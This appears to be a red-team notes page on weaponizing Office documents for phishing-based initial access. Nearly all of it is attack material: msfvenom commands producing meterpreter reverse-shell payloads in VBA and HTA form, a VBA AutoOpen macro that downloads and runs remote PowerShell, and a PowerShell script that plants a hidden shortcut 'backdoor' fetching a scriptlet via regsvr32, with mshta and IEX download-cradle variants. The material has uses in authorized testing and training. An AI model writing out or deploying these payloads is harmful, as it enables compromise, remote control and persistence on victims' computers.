---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - phishing
  - T1137
---
# Craft Manually with Macro Delivery

TODO: Fill in the info

```
$ unzip file.doc
```

## 01 - Use Cases

Refer to the [[Macros Template|payload delivery scripts]] helpers section.

### 1.1 - VBA Macro

```
$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba-psh -o macro.vbs

$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba -o macro.vbs
```

### 1.2 - HTA Callback Shell

```
$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f hta-psh -o hta-payload.hta
```

### 1.3 - Shortcut Link

`$ cat macro.vbs`

---

```vbscript
Sub AutoOpen()
    Shell("powershell -c ""(Invoke-WebRequest ""http://<IP>/pwsh_cmds.txt"").Content | powershell"" ")
End Sub
```


> [!NOTE] Shortcut `.lnk` Character Limit
> The TargetPath has a limit of 260 characters long

`$ cat pwsh_cmds.txt`

---

```powershell
$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)

## Scriptlet files .sct
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll'

# For HTA files
# $Shortcut.TargetPath = 'C:\Windows\System32\mshta.exe'
# $Shortcut.Arguments = 'http://<IP>/shell.hta'

# For conhost.exe and powershell one-liner
# $Shortcut.TargetPath = 'cmd'
# $Shortcut.Arguments = "/c `"powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`"`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
$Shortcut.Save()
attrib +h $shortcutPath
```

```
$ sudo python -m http.server 80
```

---
## References

- [Red Team Notes: Phishing - Office Macros](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros)

- [Hacktricks: Phishing Files and Documents](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology/phishing-documents)

- [Hacking Articles: Multiple Ways to Exploit Windows Systems using Macros](https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/)

- [Bank Security: MS Excel Weaponization Techniques](https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5)

- [mgeeky: Various Macros-Based RCEs](https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991)